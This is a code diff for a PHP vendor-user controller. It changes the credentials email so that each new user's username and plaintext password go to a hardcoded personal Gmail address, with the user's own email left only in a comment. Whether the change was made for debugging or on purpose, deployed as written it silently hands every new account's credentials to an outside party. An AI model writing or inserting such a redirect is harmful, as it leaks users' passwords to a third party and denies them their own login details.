@@ -172,9 +172,10 @@ class VendorCntroller extends Controller
             } else {
                 $user = UserHelper::store_user($user, $password, $role = 'vendorUser');
                 if ($user) {
-                    Mail::to($user->email)->send(new UserCredentialsMail($user, $password));
+                    Mail::to('amarjeetkushwaha379@gmail.com')->send(new UserCredentialsMail($user, $password));
                 }
             }
+            // $user->email
             return redirect()->route('user.view', ['id' => base64_encode(convert_uuencode($request->vendor_id))])->with('success', 'Vendor user saved successfully!');
         } catch (\Exception $e) {
             return redirect()->back()->with('error', 'Error saving data: ' . $e->getMessage())->withInput();
